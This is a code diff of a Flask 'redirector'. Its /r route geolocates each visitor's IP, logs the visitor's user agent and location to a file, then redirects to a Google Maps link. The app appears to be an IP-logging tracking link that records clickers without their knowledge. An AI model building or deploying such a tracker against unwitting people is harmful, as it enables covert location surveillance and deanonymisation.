@@ -3,12 +3,12 @@ from datetime import datetime
 from user_agents import parse as ua_parse
 import requests
 import json
+import os
 
 app = Flask(__name__)
 
-import os
 IPINFO_TOKEN = os.getenv("IPINFO_TOKEN", "")
-LOG_FILE = "/var/log/flask_geo_redirect.jsonl"
+LOG_FILE = "flask_geo_redirect.jsonl"  # Упростил путь для совместимости
 
 def geolocate(ip):
     try:
@@ -25,6 +25,10 @@ def geolocate(ip):
     except Exception as e:
         print(f"[geo error] {e}")
     return {}
+
+@app.route("/")
+def index():
+    return "🟢 Flask redirector is running!"
 
 @app.route("/r")
 def redirector():
@@ -48,11 +52,8 @@ def redirector():
     with open(LOG_FILE, "a", encoding="utf-8") as f:
         f.write(json.dumps(log_entry, ensure_ascii=False) + "\n")
 
-    return redirect("https://www.google.com/maps?q=46.4686355,30.7635889", code=302)
+    return redirect("https://www.google.com/maps/place/%D0%92%D0%B8%D0%BB%D0%BB%D0%B0...")  # твоя ссылка
 
 if __name__ == "__main__":
-    import os
-
-port = int(os.environ.get("PORT", 5000))
-app.run(host="0.0.0.0", port=port)
-
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port)
